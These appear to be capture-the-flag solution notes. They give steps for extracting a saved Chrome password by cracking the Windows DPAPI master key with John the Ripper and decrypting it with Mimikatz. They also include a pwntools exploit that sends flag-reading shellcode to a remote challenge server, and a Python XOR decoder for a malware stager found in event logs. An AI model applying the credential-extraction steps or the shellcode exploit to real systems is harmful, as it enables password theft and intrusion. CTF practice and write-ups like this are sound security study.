```
1. Find encrypted Chrome password in "AppData/Local/Google/Chrome/User Data/Default/Login Data"
2. Find encrypted key for password in "AppData/Local/Google/Chrome/User Data/Local State"
3. Find encrypted master key in "AppData/Roaming/Microsoft/Protect/S-1-5-21-3702016591-3723034727-1691771208-1002/865be7a6-863c-4d73-ac9f-233f8734089d"
4. MK is encrypted with user's computer password - crack with JtR:
  $ DPAPImk2john.py -mk AppData/Roaming/Microsoft/Protect/S-1-5-21-3702016591-3723034727-1691771208-1002/865be7a6-863c-4d73-ac9f-233f8734089d -c local -S S-1-5-21-3702016591-3723034727-1691771208-1002 > hash.txt
  $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
5. Decrypt Master Key with cracked computer password ("ransom") with Mimikatz
6. Decrypt encrypted key with master key (again Mimikatz)
7. AES-decrypt Chrome password with key
8. Flaaaag
```

```python
from pwn import *

exe = context.binary = ELF('./fleet_management', checksec=False)
context.terminal = ['mate-terminal', '-e']

# p = process(exe.path)
p = remote('138.68.175.87', 31448)

shellcode = asm(f'''
  push 0x0
  mov rdi,-0x64
  mov rax,0x7478742e67616c66
  push rax
  mov rsi,rsp
  xor edx,edx
  mov eax,{constants.SYS_openat}
  syscall

  mov edi,0x1
  mov esi,eax
  xor edx,edx
  mov r10,0x32
  mov eax,{constants.SYS_sendfile}
  syscall
''')

assert len(shellcode) <= 60

p.recvuntil(b'Loading . . .\n\x1b[1;36m')
sleep(1)
p.sendlineafter(b'do? ', b'9')

# gdb.attach(p, gdbscript='b* beta_feature+95')
p.sendline(shellcode)
p.interactive()
```

```sh
#!/bin/bash
for f in *.evtx
do
 echo "Processing $f";
 evtx_dump.py "$f" > "$f".xml;
 #sleep(1)
done

Then I got real lucky grepping for DES (from the description of the missle in the info) and caught 
$description = "Steal weapons"

Looking more closely at that file, there is a stager with byte code I made a python script to reverse engineer.

stage1 = [0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3]
stage2 = [0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1]
stage2 = stage2[::-1]
stage3 = stage1 + stage2

s=''

for i in stage3:
    s = s + chr(i ^ 0xd1)

print (s)
```